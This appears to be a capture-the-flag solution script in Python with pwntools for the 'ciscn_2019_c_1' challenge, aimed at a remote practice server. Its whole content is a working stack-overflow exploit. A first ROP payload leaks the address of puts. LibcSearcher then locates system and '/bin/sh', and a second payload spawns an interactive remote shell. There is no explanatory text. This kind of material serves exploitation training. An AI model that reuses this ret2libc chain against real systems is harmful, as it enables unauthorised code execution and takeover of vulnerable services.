from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')



elf = ELF('./ciscn_2019_c_1')
#io = process('./ciscn_2019_c_1')
io = remote('node4.buuoj.cn',28801)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pop_rdi_ret = 0x400c83 
#vul_fun_addr = 0x04009A0
main_addr = elf.symbols['main']

ret_addr = 0x4006b9

payload1 = cyclic(0x50+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

io.sendlineafter('Input your choice!\n', '1')
io.sendlineafter('Input your Plaintext to be encrypted\n', payload1)

io.recvuntil(b'Ciphertext\n')
io.recvuntil(b'\n')

#puts_addr = u64(io.recvuntil(b'\n',drop=True).ljust(8,b'\x00'))
puts_addr = u64(io.recv(7)[:-1].ljust(8,b'\x00'))

print(puts_addr)


libc = LibcSearcher('puts', puts_addr)
print(libc)
libcbase = puts_addr - libc.dump('puts')

sys_addr = libcbase + libc.dump('system')
bin_sh = libcbase + libc.dump('str_bin_sh')
payload2 = cyclic(0x50+8) + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)

io.sendlineafter('Input your choice!\n', '1')
io.sendlineafter('Input your Plaintext to be encrypted\n', payload2)
io.interactive()

